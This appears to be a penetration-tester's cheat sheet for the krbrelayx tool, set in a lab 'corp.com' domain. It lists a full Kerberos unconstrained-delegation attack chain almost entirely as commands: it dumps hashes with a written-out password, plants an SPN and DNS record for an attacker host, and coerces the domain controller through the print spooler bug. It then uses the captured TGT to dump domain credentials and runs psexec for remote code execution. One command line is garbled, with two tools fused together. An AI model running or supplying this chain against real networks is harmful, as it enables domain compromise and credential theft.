# Name
Krbrelayx

## Usage
```
# Dump NTLM Hashes for Files01 computer account
impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104

# Add SPN for attacker.corp.com on FILES01$
python3 addspn.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -s HOST/attacker.corp.com --additional 'dc01.corp.com'

# Add a DNS Entry for attacker.corp.com in Active Directory
python3 dnstool.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -r 'attacker.corp.com' -d '192.168.45.211' --action add 'dc01.corp.com'

# Verify DNS Resolution for Attacker Host
nslookup attacker.corp.com dc01.corp.com

# Start krbrelayx to Relay Authenticated TGT
python3 krbrelayx.py -aesKey <aes256-cts-hmac-sha1-96>

# Trigger Authentication from the DC Using the Print Spooler Bug
python3 krbrelayx.py -aesKey python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"

# Trigger Authentication from the DC Using the Print Spooler Bug
python3 printerbug.py "corp.com/FILES01$"@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:22a506a9cabc86c93dda21decc4b2e75 "attacker.corp.com"

# Importing the ccache file
mv DC01\$@CORP.COM_krbtgt@CORP.COM.ccache administrator.ccache
export KRB5CCNAME=administrator.ccache

# Use the Captured TGT to Dump Credentials from the DC
impacket-secretsdump -k -no-pass "corp.com/DC01$"@dc01.corp.com

# Running Impacket-PsExec for Remote Code Execution
impacket-psexec admin@dc01.corp.com -hashes :<nt hash>
```

## Source
https://github.com/dirkjanm/krbrelayx
